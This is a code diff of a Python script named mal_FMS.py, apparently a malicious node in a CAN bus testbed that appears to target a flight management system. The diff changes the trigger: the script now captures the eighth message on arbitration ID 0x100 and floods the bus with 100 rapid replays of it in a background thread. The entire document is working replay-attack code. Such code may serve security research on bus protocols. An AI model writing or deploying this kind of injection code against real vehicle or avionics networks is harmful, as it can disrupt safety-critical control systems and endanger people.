@@ -1,16 +1,15 @@
-# mal_FMS.py
-
 import can
 import time
 import threading
 
 ARBITRATION_ID = 0x100
-REPLAY_COUNT = 100     # how many times to replay on trigger
-REPLAY_DELAY = 0.01    # delay between replays (seconds)
+REPLAY_COUNT = 100
+REPLAY_DELAY = 0.01
+
+CAPTURE_INDEX = 8  # capture the 8th message
 
 
 def decode_40bit_from_bytes(data_bytes: bytes) -> dict:
-    # decode
     if len(data_bytes) != 5:
         return None
     word_full = int.from_bytes(data_bytes, byteorder='big')
@@ -32,7 +31,6 @@ def decode_40bit_from_bytes(data_bytes: bytes) -> dict:
 
 
 def replay_frame(bus, raw_bytes: bytes, count=REPLAY_COUNT, delay=REPLAY_DELAY):
-    # does the replay flood
     msg = can.Message(arbitration_id=ARBITRATION_ID, data=raw_bytes, is_extended_id=False)
     for i in range(count):
         try:
@@ -44,21 +42,26 @@ def replay_frame(bus, raw_bytes: bytes, count=REPLAY_COUNT, delay=REPLAY_DELAY):
 
 
 def listener_loop(bus):
-    # listens for the down label before it triggers replay
+    message_count = 0
+    captured_frame = None
+
     while True:
         msg = bus.recv(timeout=1)
         if not msg:
             continue
-        data_bytes = msg.data
-        decoded = decode_40bit_from_bytes(data_bytes)
-        if decoded is None:
-            continue
 
-        # Trigger the replay
-        if decoded["label"] == 0x00 and decoded["data"] == 0:
-            print("[mal_FMS]: Trigger detected. Replaying captured frame...")
-            t = threading.Thread(target=replay_frame, args=(bus, data_bytes))
+        message_count += 1
+        print(f"[mal_FMS] Saw message #{message_count}")
+
+        if message_count == CAPTURE_INDEX:
+            captured_frame = msg.data
+            print(f"[mal_FMS] Captured message #{CAPTURE_INDEX} for replay!")
+            
+            # Automatically start replay flood
+            t = threading.Thread(target=replay_frame, args=(bus, captured_frame))
             t.start()
+            
+            continue
 
 
 def main():
